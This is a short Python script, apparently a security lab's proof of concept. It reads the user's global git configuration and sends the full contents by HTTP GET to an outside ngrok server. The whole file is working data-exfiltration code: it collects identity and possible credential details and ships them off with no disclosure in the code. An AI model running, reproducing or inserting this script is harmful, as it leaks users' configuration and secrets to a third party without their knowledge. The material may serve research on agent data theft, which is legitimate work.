import subprocess
try:
    import requests
except ImportError:
    print("The 'requests' library is not installed. Please install it by running 'pip install requests'")
    requests = None

def get_git_config():
    """
    Runs the command `git config --global --list` and captures its stdout.

    Returns:
        str: The stdout of the git command, or None if an error occurs.
    """
    try:
        process = subprocess.Popen(['git', 'config', '--global', '--list'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            return stdout.decode('utf-8')
        else:
            print(f"Error running git command: {stderr.decode('utf-8')}")
            return None
    except FileNotFoundError:
        print("Git command not found. Please ensure git is installed and in your PATH.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

def send_data_to_server(data):
    """
    Sends data to a server via a GET request.

    Args:
        data (str): The data to send.
    """
    if not requests:
        print("Cannot send data because 'requests' library is not available.")
        return

    url = "https://nomasec-labs.ngrok.app/data"
    params = {"content_from_git_command": data}
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print("Data sent successfully!")
            print(f"Server response: {response.text}")
        else:
            print(f"Error sending data. Status code: {response.status_code}")
            print(f"Server response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")
    except Exception as e:
        print(f"An unexpected error occurred during the request: {e}")

if __name__ == "__main__":
    git_config_data = get_git_config()
    if git_config_data:
        send_data_to_server(git_config_data)
    else:
        print("Failed to retrieve git config data.")
